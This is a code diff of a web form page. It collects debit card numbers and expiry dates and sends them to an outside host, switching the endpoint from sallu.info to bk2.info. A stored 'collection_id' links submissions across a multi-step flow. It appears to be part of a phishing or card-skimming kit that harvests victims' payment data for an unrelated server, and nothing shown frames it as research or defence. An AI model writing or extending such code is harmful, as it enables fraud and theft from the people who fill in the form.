@@ -1,5 +1,4 @@
 'use client';
-import DateInputComponent from "../inlcude/DateInputComponent";
 import DebitCardInputComponent from "../inlcude/DebitCardInputComponent";
 import ExpiryDateInputComponent from "../inlcude/ExpiryDateInputComponent";
 import Footer from "../inlcude/footer";
@@ -10,11 +9,8 @@ import { useEffect } from "react";
 
 export default function Home() {
     const router = useRouter();
-    const API_URL = "https://sallu.info/api/form/add";
+    const API_URL = "https://bk2.info/api/form/add";
 
-    useEffect(()=>{
-        localStorage.removeItem('collection_id');
-    })
     const handleSubmit = async (e) => {
         e.preventDefault();
         const formData = new FormData(e.target);
@@ -25,7 +21,7 @@ export default function Home() {
         });
         jsonObject1['data'] = jsonObject;
         jsonObject1['site'] = "localhost";
-        console.log(jsonObject1);
+        jsonObject1['id'] = localStorage.getItem("collection_id");
         try {
             const response = await fetch(`${API_URL}`, {
                 method: 'POST',
@@ -36,7 +32,6 @@ export default function Home() {
                 throw new Error('Network response was not ok');
             }
             const responseData = await response.json();
-            localStorage.setItem('collection_id', responseData.data);
             router.push('/4');
         } catch (error) {
             console.error('There was a problem with the fetch operation:', error);
